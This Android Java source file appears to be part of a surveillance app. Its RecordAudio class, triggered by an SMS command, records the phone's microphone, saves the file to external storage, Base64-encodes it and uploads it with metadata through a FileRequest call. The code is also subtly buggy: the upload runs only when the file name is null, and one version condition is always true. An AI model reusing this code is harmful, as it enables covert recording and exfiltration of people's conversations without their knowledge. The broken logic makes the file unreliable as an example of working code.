package com.inet.android.audio;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import org.apache.commons.io.FileUtils;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.util.Base64;

import com.inet.android.request.FileRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * RecordAudio class is designed to record audio after command
 * smsBroadcastReceiver
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudio {

	private static final int RECORDING_BITRATE = 44100;
	private static final int RECORDING_BITRATE_OLD = 8000;

	private MediaRecorder mMediaRecorder;
	private final String TAG = "RecordAudio";
	private ConvertDate date;
	private String time;
	private static final String mPathName = "data";
	private static final String recordTypeStr = "22";

	// Thread pool
	private ExecutorService mThreadPool;
	int minute;
	private AtomicBoolean mIsPlaying = new AtomicBoolean(false);
	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
	private String outputFileName;
	private String LOG_TAG = "RecordAudio";
	private static Context mContext;

	public RecordAudio(Context context, int minute) {
		Logging.doLog(TAG, " RecordAudio", " RecordAudio");
		mThreadPool = Executors.newCachedThreadPool();
		this.minute = minute;
		RecordAudio.mContext = context;
	}

	// --------create Record and start recording---------------
	public void createRecord(String fileName) {
		// reset any previous paused position
		String format = ".aac";
		// initialise MediaRecorder
		if (mMediaRecorder == null) {
			mMediaRecorder = new MediaRecorder();
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);

			if (Build.VERSION.SDK_INT >= 16) {

				Logging.doLog(TAG, "Build.VERSION.SDK_INT >= 16");

				mMediaRecorder
						.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
				mMediaRecorder
						.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);
				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
				mMediaRecorder.setAudioEncodingBitRate(32);

			} else if (Build.VERSION.SDK_INT >= 10
					|| Build.VERSION.SDK_INT < 16) {

				Logging.doLog(TAG, "Build.VERSION.SDK_INT >= 10");

				mMediaRecorder
						.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
				mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
				mMediaRecorder.setAudioEncodingBitRate(48);

			} else {
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
				mMediaRecorder
						.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				mMediaRecorder
						.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE_OLD);
				mMediaRecorder.setAudioEncodingBitRate(8);

			}
			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
		} else {
			mMediaRecorder.stop();
			mMediaRecorder.reset();
		}

		mMediaRecorder.setOutputFile(fileName + format);
		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
		} catch (IllegalStateException e) {
			Logging.doLog(TAG,
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (IOException e) {
			Logging.doLog(TAG,
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
	}

	// --------create Recording----------------
	public void executeRecording() {
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				outputFileName = getOutputFileName();
				if (outputFileName != null) {
					Logging.doLog(TAG, "record", "record");
					mIsPlaying.set(false);
					createRecord(outputFileName);
					mIsRecording.set(true);
					// launch tehe counter
					Logging.doLog(TAG, "mThreadPool.execute",
							"mThreadPool.execute");

					mThreadPool.execute(new RecordingCounterUpdater());
				}
			}
		});
	}

	// --------stop recording and call sendAudio----------------
	private void executeStopRecording() {
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				if (mMediaRecorder != null) {
					stopRecording();
					mIsRecording.set(false);
					if (outputFileName == null)
						SendAudio(outputFileName);
					outputFileName = null;
				}

			}
		});

	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private String getOutputFileName() {
		date = new ConvertDate();
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = date.logTime();

		String file = dir + "/" + time;
		Logging.doLog(TAG, "file " + file, "file " + file);
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(TAG, "Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private final class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			while (mIsRecording.get()) {
				postCounterUpdateMessage(currentCounter);
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// Re-assert the thread's interrupted status
					Thread.currentThread().interrupt();
					return;
				}
				currentCounter++;
			}

		}

	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private void postCounterUpdateMessage(int currentPosition) {
		Logging.doLog(TAG,
				String.format("posting counter update of:%d", currentPosition));
		if (currentPosition == minute) {
			Logging.doLog(TAG, "equals = " + minute);
			executeStopRecording();
		}
	}

	private void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(TAG, "Stopping recording");
			mMediaRecorder.stop();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
	}

	private String encodeFileToBase64Binary(String fileName) throws IOException {

		File file = new File(fileName);
		byte[] bytes = FileUtils.readFileToByteArray(file);
		String encoded = Base64.encodeToString(bytes, 0);
		return encoded;
	}

	private void SendAudio(String path) {
		String sendJSONStr = null;
		JSONObject object = new JSONObject();
		ConvertDate getDate = new ConvertDate();
		try {
			object.put("time", getDate.logTime());
			object.put("type", recordTypeStr);
			object.put("duration", this.minute);
			object.put("path", path);
			object.put("record", encodeFileToBase64Binary(path));

			// sendJSONStr = jsonObject.toString();
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		FileRequest audio = new FileRequest(mContext);
		audio.sendRequest(sendJSONStr); // добавить строку request

	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	public class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;

			}

			Logging.doLog(TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra));
		}

	}

}
